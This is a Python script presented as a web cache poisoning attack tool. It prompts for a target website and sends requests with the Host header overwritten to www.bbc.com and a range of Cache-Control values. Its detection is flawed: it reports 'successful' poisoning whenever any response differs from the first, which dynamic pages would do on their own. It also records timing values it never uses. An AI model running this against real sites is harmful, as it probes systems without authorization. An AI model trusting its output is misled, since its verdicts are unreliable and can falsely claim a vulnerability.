import requests
import time
from colorama import init, Fore

# Initialize colorama
init()

def test_cache_poisoning(url):
    try:
        # Define a list of payloads for cache poisoning
        payloads = [
            {'Host': 'www.bbc.com', 'Cache-Control': 'public, max-age=1000', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'public, max-age=0', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'no-store', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'no-cache', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'max-age=0', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'private', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'no-store, must-revalidate', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'public, s-maxage=3600', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'public, max-age=3600, s-maxage=3600', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'no-cache, max-age=0, must-revalidate', 'Content-Type': 'text/html'},
            {'Host': 'www.bbc.com', 'Cache-Control': 'public, proxy-revalidate, s-maxage=3600', 'Content-Type': 'text/html'},
            # Add more payloads with different headers as needed
        ]

        # Initialize variables to track response differences and timing
        baseline_response = None
        successful_response = None

        # Send multiple GET requests with different payloads
        for payload in payloads:
            start_time = time.time()  # Record start time of request

            response = requests.get(url, headers=payload)
            
            end_time = time.time()  # Record end time of request

            # Check if the response status code indicates success (2xx or 3xx)
            if response.status_code in range(200, 400):
                # Save the first successful response as the baseline for comparison
                if baseline_response is None:
                    baseline_response = response
                elif response.text != baseline_response.text:
                    successful_response = response
                    break  # Exit the loop once a successful poisoning is detected

        if successful_response:
            print(Fore.GREEN + "Cache poisoning successful!")
            # Print the successful response for analysis
            print(Fore.YELLOW + "Successful Response Content:")
            print(successful_response.text)
        else:
            print(Fore.RED + "Cache poisoning unsuccessful. Target website may not be vulnerable.")
    except Exception as e:
        print(Fore.RED + "An error occurred:", str(e))

# Example usage
if __name__ == "__main__":
    # Prompt the user to enter the target website URL
    target_url = input("Enter your target website URL: ")

    # Call the function with the target URL
    test_cache_poisoning(target_url)
